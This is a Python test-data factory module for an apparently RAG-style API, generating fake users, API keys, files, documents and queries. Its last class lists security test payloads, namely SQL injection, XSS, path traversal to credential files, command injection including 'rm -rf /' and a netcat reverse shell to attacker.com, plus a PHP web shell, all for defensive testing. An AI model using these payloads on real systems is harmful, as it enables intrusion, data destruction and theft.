"""Test data factories and generators using Faker."""

import random
import secrets
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from faker import Faker

fake = Faker()


class UserFactory:
    """Factory for generating test user data."""
    
    @staticmethod
    def create_user(user_id: Optional[str] = None, **kwargs) -> Dict[str, Any]:
        """Create a test user."""
        return {
            'user_id': user_id or fake.uuid4(),
            'username': kwargs.get('username', fake.user_name()),
            'email': kwargs.get('email', fake.email()),
            'password': kwargs.get('password', fake.password(length=12)),
            'created_at': kwargs.get('created_at', fake.date_time_this_year()),
            'is_active': kwargs.get('is_active', True),
            'is_admin': kwargs.get('is_admin', False),
            'profile': {
                'first_name': fake.first_name(),
                'last_name': fake.last_name(),
                'company': fake.company(),
                'job_title': fake.job(),
                'phone': fake.phone_number(),
                'timezone': fake.timezone(),
                'language': random.choice(['en', 'es', 'fr', 'de', 'zh']),
            }
        }
    
    @staticmethod
    def create_batch_users(count: int, **kwargs) -> List[Dict[str, Any]]:
        """Create multiple test users."""
        return [UserFactory.create_user(**kwargs) for _ in range(count)]


class APIKeyFactory:
    """Factory for generating API key test data."""
    
    @staticmethod
    def create_api_key(user_id: str, name: Optional[str] = None, **kwargs) -> Dict[str, Any]:
        """Create a test API key."""
        return {
            'key_id': kwargs.get('key_id', secrets.token_hex(16)),
            'api_key': kwargs.get('api_key', f"rag_api_{secrets.token_urlsafe(32)}"),
            'user_id': user_id,
            'name': name or fake.word() + '_' + fake.word(),
            'created_at': kwargs.get('created_at', fake.date_time_this_month()),
            'expires_at': kwargs.get('expires_at', fake.date_time_between(start_date='+30d', end_date='+365d')),
            'is_active': kwargs.get('is_active', True),
            'rate_limit_per_minute': kwargs.get('rate_limit_per_minute', random.choice([60, 100, 500, 1000])),
            'permissions': kwargs.get('permissions', ['read', 'write']),
            'last_used_at': kwargs.get('last_used_at', None),
            'usage_count': kwargs.get('usage_count', 0),
        }
    
    @staticmethod
    def create_batch_api_keys(user_id: str, count: int) -> List[Dict[str, Any]]:
        """Create multiple API keys for a user."""
        return [APIKeyFactory.create_api_key(user_id) for _ in range(count)]


class FileFactory:
    """Factory for generating test file data."""
    
    @staticmethod
    def create_text_file(filename: Optional[str] = None, **kwargs) -> Dict[str, Any]:
        """Create a test text file."""
        content = kwargs.get('content', fake.text(max_nb_chars=2000))
        return {
            'filename': filename or f"{fake.word()}.txt",
            'content': content.encode('utf-8'),
            'content_type': 'text/plain',
            'size': len(content.encode('utf-8')),
            'encoding': 'utf-8',
        }
    
    @staticmethod
    def create_pdf_file(filename: Optional[str] = None, **kwargs) -> Dict[str, Any]:
        """Create a mock PDF file."""
        # Minimal PDF structure
        pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>
endobj
4 0 obj
<< /Length {len(fake.text(max_nb_chars=200))} >>
stream
BT
/F1 12 Tf
100 700 Td
({fake.text(max_nb_chars=200)}) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
279
%%EOF"""
        
        return {
            'filename': filename or f"{fake.word()}.pdf",
            'content': pdf_content.encode('utf-8'),
            'content_type': 'application/pdf',
            'size': len(pdf_content.encode('utf-8')),
        }
    
    @staticmethod
    def create_image_file(filename: Optional[str] = None, **kwargs) -> Dict[str, Any]:
        """Create a mock image file."""
        # Simple PNG header and minimal data
        png_header = b'\x89PNG\r\n\x1a\n'
        png_data = png_header + b'MOCK_IMAGE_DATA' + fake.binary(length=100)
        
        return {
            'filename': filename or f"{fake.word()}.png",
            'content': png_data,
            'content_type': 'image/png',
            'size': len(png_data),
        }
    
    @staticmethod
    def create_large_file(size_mb: int = 10, filename: Optional[str] = None) -> Dict[str, Any]:
        """Create a large test file."""
        size_bytes = size_mb * 1024 * 1024
        content = fake.binary(length=size_bytes)
        
        return {
            'filename': filename or f"large_{size_mb}mb.bin",
            'content': content,
            'content_type': 'application/octet-stream',
            'size': len(content),
        }
    
    @staticmethod
    def create_batch_files(count: int, file_type: str = 'text') -> List[Dict[str, Any]]:
        """Create multiple test files."""
        if file_type == 'text':
            return [FileFactory.create_text_file() for _ in range(count)]
        elif file_type == 'pdf':
            return [FileFactory.create_pdf_file() for _ in range(count)]
        elif file_type == 'image':
            return [FileFactory.create_image_file() for _ in range(count)]
        else:
            # Mixed types
            files = []
            for _ in range(count):
                file_type = random.choice(['text', 'pdf', 'image'])
                if file_type == 'text':
                    files.append(FileFactory.create_text_file())
                elif file_type == 'pdf':
                    files.append(FileFactory.create_pdf_file())
                else:
                    files.append(FileFactory.create_image_file())
            return files


class DocumentFactory:
    """Factory for generating test document data."""
    
    @staticmethod
    def create_document(**kwargs) -> Dict[str, Any]:
        """Create a test document."""
        return {
            'document_id': kwargs.get('document_id', fake.uuid4()),
            'title': kwargs.get('title', fake.sentence(nb_words=4).rstrip('.')),
            'content': kwargs.get('content', fake.text(max_nb_chars=5000)),
            'summary': kwargs.get('summary', fake.text(max_nb_chars=200)),
            'author': kwargs.get('author', fake.name()),
            'created_at': kwargs.get('created_at', fake.date_time_this_year()),
            'updated_at': kwargs.get('updated_at', fake.date_time_this_month()),
            'tags': kwargs.get('tags', fake.words(nb=random.randint(1, 5))),
            'category': kwargs.get('category', random.choice(['research', 'technical', 'business', 'legal', 'medical'])),
            'language': kwargs.get('language', random.choice(['en', 'es', 'fr', 'de'])),
            'source': kwargs.get('source', fake.url()),
            'file_path': kwargs.get('file_path', fake.file_path()),
            'metadata': {
                'word_count': random.randint(100, 2000),
                'reading_time': random.randint(2, 15),
                'difficulty': random.choice(['easy', 'medium', 'hard']),
                'topics': fake.words(nb=random.randint(2, 8)),
            }
        }
    
    @staticmethod
    def create_multimodal_document(**kwargs) -> Dict[str, Any]:
        """Create a multimodal test document."""
        doc = DocumentFactory.create_document(**kwargs)
        doc['multimodal_content'] = [
            {
                'type': 'table',
                'table_data': fake.csv(header=('Name', 'Age', 'City', 'Salary'), 
                                     data_columns=('{{name}}', '{{random_int}}', '{{city}}', '{{random_int}}'),
                                     num_rows=random.randint(3, 10)),
                'table_caption': fake.sentence()
            },
            {
                'type': 'image',
                'image_path': fake.file_path(extension='jpg'),
                'image_caption': fake.sentence(),
                'alt_text': fake.sentence()
            },
            {
                'type': 'equation',
                'equation': r'\sum_{i=1}^{n} x_i = \bar{x} \cdot n',
                'description': fake.sentence()
            }
        ]
        return doc


class QueryFactory:
    """Factory for generating test query data."""
    
    @staticmethod
    def create_text_query(**kwargs) -> Dict[str, Any]:
        """Create a test text query."""
        return {
            'query_id': kwargs.get('query_id', fake.uuid4()),
            'query': kwargs.get('query', fake.sentence(nb_words=random.randint(3, 12)) + '?'),
            'mode': kwargs.get('mode', random.choice(['hybrid', 'local', 'global', 'naive'])),
            'kb_id': kwargs.get('kb_id', fake.word() + '_kb'),
            'top_k': kwargs.get('top_k', random.randint(3, 20)),
            'user_id': kwargs.get('user_id', fake.uuid4()),
            'timestamp': kwargs.get('timestamp', fake.date_time_this_month()),
            'filters': kwargs.get('filters', {}),
            'metadata': {
                'source': random.choice(['web', 'api', 'mobile']),
                'session_id': fake.uuid4(),
                'ip_address': fake.ipv4(),
                'user_agent': fake.user_agent(),
            }
        }
    
    @staticmethod
    def create_multimodal_query(**kwargs) -> Dict[str, Any]:
        """Create a multimodal test query."""
        query = QueryFactory.create_text_query(**kwargs)
        query['multimodal_content'] = [
            {
                'type': random.choice(['table', 'image', 'equation']),
                'data': fake.text(max_nb_chars=500) if random.choice([True, False]) else fake.binary(length=100),
                'caption': fake.sentence(),
            }
            for _ in range(random.randint(1, 3))
        ]
        return query
    
    @staticmethod
    def create_batch_queries(count: int, query_type: str = 'text') -> List[Dict[str, Any]]:
        """Create multiple test queries."""
        if query_type == 'text':
            return [QueryFactory.create_text_query() for _ in range(count)]
        elif query_type == 'multimodal':
            return [QueryFactory.create_multimodal_query() for _ in range(count)]
        else:
            # Mixed types
            return [
                QueryFactory.create_multimodal_query() if random.choice([True, False])
                else QueryFactory.create_text_query()
                for _ in range(count)
            ]


class KnowledgeBaseFactory:
    """Factory for generating knowledge base test data."""
    
    @staticmethod
    def create_knowledge_base(**kwargs) -> Dict[str, Any]:
        """Create a test knowledge base."""
        return {
            'kb_id': kwargs.get('kb_id', f"{fake.word()}_{fake.word()}_kb"),
            'name': kwargs.get('name', f"{fake.word().title()} Knowledge Base"),
            'description': kwargs.get('description', fake.text(max_nb_chars=300)),
            'owner_id': kwargs.get('owner_id', fake.uuid4()),
            'created_at': kwargs.get('created_at', fake.date_time_this_year()),
            'updated_at': kwargs.get('updated_at', fake.date_time_this_month()),
            'is_public': kwargs.get('is_public', random.choice([True, False])),
            'document_count': kwargs.get('document_count', random.randint(0, 1000)),
            'total_size_bytes': kwargs.get('total_size_bytes', random.randint(1024, 1024*1024*100)),
            'settings': {
                'chunk_size': random.choice([500, 1000, 1500, 2000]),
                'chunk_overlap': random.choice([50, 100, 200, 300]),
                'embedding_model': random.choice(['openai', 'huggingface', 'sentence-transformers']),
                'language': random.choice(['en', 'multi']),
                'auto_update': random.choice([True, False]),
            },
            'tags': kwargs.get('tags', fake.words(nb=random.randint(1, 5))),
            'category': kwargs.get('category', random.choice(['research', 'business', 'personal', 'educational'])),
        }


class ResponseFactory:
    """Factory for generating test API response data."""
    
    @staticmethod
    def create_success_response(data: Any = None, **kwargs) -> Dict[str, Any]:
        """Create a successful API response."""
        return {
            'success': True,
            'status_code': kwargs.get('status_code', 200),
            'message': kwargs.get('message', 'Operation completed successfully'),
            'data': data or {},
            'timestamp': kwargs.get('timestamp', datetime.utcnow().isoformat()),
            'request_id': kwargs.get('request_id', fake.uuid4()),
        }
    
    @staticmethod
    def create_error_response(error_code: str = None, **kwargs) -> Dict[str, Any]:
        """Create an error API response."""
        return {
            'success': False,
            'status_code': kwargs.get('status_code', 400),
            'error': error_code or random.choice(['VALIDATION_ERROR', 'NOT_FOUND', 'UNAUTHORIZED', 'INTERNAL_ERROR']),
            'message': kwargs.get('message', fake.sentence()),
            'details': kwargs.get('details', fake.text(max_nb_chars=200)),
            'timestamp': kwargs.get('timestamp', datetime.utcnow().isoformat()),
            'request_id': kwargs.get('request_id', fake.uuid4()),
        }
    
    @staticmethod
    def create_paginated_response(items: List[Any], page: int = 1, per_page: int = 20) -> Dict[str, Any]:
        """Create a paginated API response."""
        total_items = len(items)
        start_idx = (page - 1) * per_page
        end_idx = start_idx + per_page
        page_items = items[start_idx:end_idx]
        
        return {
            'success': True,
            'data': page_items,
            'pagination': {
                'page': page,
                'per_page': per_page,
                'total_items': total_items,
                'total_pages': (total_items + per_page - 1) // per_page,
                'has_next': end_idx < total_items,
                'has_prev': page > 1,
            },
            'timestamp': datetime.utcnow().isoformat(),
        }


class PerformanceDataFactory:
    """Factory for generating performance test data."""
    
    @staticmethod
    def create_load_test_scenario(**kwargs) -> Dict[str, Any]:
        """Create a load test scenario."""
        return {
            'scenario_name': kwargs.get('scenario_name', fake.word() + '_load_test'),
            'users': kwargs.get('users', random.randint(10, 100)),
            'spawn_rate': kwargs.get('spawn_rate', random.randint(1, 10)),
            'duration': kwargs.get('duration', f"{random.randint(5, 60)}m"),
            'endpoints': kwargs.get('endpoints', [
                {'path': '/api/v1/health', 'weight': 5},
                {'path': '/api/v1/query', 'weight': 3},
                {'path': '/api/v1/files', 'weight': 2},
            ]),
            'think_time': kwargs.get('think_time', random.uniform(0.5, 3.0)),
            'failure_rate_threshold': kwargs.get('failure_rate_threshold', 0.05),
            'response_time_threshold': kwargs.get('response_time_threshold', 2.0),
        }
    
    @staticmethod
    def create_benchmark_data(**kwargs) -> Dict[str, Any]:
        """Create benchmark test data."""
        return {
            'test_name': kwargs.get('test_name', fake.word() + '_benchmark'),
            'operation': kwargs.get('operation', random.choice(['query', 'upload', 'process', 'auth'])),
            'iterations': kwargs.get('iterations', random.randint(100, 1000)),
            'warmup_iterations': kwargs.get('warmup_iterations', random.randint(10, 50)),
            'expected_min_ops_per_sec': kwargs.get('expected_min_ops_per_sec', random.randint(10, 100)),
            'max_response_time_ms': kwargs.get('max_response_time_ms', random.randint(100, 2000)),
            'memory_threshold_mb': kwargs.get('memory_threshold_mb', random.randint(50, 500)),
        }


class MaliciousDataFactory:
    """Factory for generating malicious/attack test data."""
    
    @staticmethod
    def create_sql_injection_payloads() -> List[str]:
        """Create SQL injection test payloads."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM sensitive_table --",
            "1'; EXEC xp_cmdshell('dir'); --",
        ]
    
    @staticmethod
    def create_xss_payloads() -> List[str]:
        """Create XSS test payloads."""
        return [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src=javascript:alert('xss')>",
            "onmouseover=alert('xss')",
        ]
    
    @staticmethod
    def create_path_traversal_payloads() -> List[str]:
        """Create path traversal test payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "file:///etc/passwd",
            "/etc/passwd%00.txt",
        ]
    
    @staticmethod
    def create_command_injection_payloads() -> List[str]:
        """Create command injection test payloads."""
        return [
            "; cat /etc/passwd",
            "| whoami",
            "& ls -la",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "test; nc -e /bin/sh attacker.com 1234",
        ]
    
    @staticmethod
    def create_malicious_files() -> Dict[str, Dict[str, Any]]:
        """Create malicious file payloads."""
        return {
            'executable': {
                'filename': 'malware.exe',
                'content': b'\x4D\x5A\x90\x00',  # PE executable header
                'content_type': 'application/octet-stream',
            },
            'php_shell': {
                'filename': 'shell.php',
                'content': b"<?php system($_GET['cmd']); ?>",
                'content_type': 'text/plain',
            },
            'script_injection': {
                'filename': 'script.txt',
                'content': b"<script>alert('xss')</script>",
                'content_type': 'text/plain',
            },
            'zip_bomb_mock': {
                'filename': 'bomb.zip',
                'content': b'PK\x03\x04' + b'A' * 1000,  # Mock zip bomb
                'content_type': 'application/zip',
            },
        }


# Convenience functions
def create_test_user(**kwargs) -> Dict[str, Any]:
    """Convenience function to create a test user."""
    return UserFactory.create_user(**kwargs)


def create_test_file(file_type: str = 'text', **kwargs) -> Dict[str, Any]:
    """Convenience function to create a test file."""
    if file_type == 'text':
        return FileFactory.create_text_file(**kwargs)
    elif file_type == 'pdf':
        return FileFactory.create_pdf_file(**kwargs)
    elif file_type == 'image':
        return FileFactory.create_image_file(**kwargs)
    else:
        raise ValueError(f"Unsupported file type: {file_type}")


def create_test_query(**kwargs) -> Dict[str, Any]:
    """Convenience function to create a test query."""
    return QueryFactory.create_text_query(**kwargs)